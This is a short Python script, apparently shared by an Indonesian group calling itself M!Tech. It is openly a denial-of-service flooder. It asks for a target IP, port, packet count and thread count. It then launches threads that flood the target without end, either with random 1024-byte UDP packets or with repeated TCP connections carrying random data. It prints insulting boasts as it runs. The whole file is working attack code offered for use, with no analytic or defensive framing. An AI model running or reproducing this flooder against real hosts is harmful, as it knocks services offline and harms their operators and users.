#!/usr/bin/env python3
#Jangan ganti Nama Nya ini Buat M!Tech Anjing
#Ddos by RdNs M!Tech
import random
import socket
import threading
import os

os.system("clear")
print("Tools By RdNs M!Tech")
print("Pasti Tembus Nih Kalau M!Tech Yang Ddos")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" UDAH SIAP BELUM?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[M!]","[M!]","[M!]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Down lu anjing tools M!Tech nih")
    except:
      print("[!] DAH LAH CAPEK M!TECH RDP LU NGAK KUAT")

def run2():
  data = random._urandom(16)
  i = random.choice(("[M!]","[M!]","[M!]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" RdNs disini bersama M!tech ")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
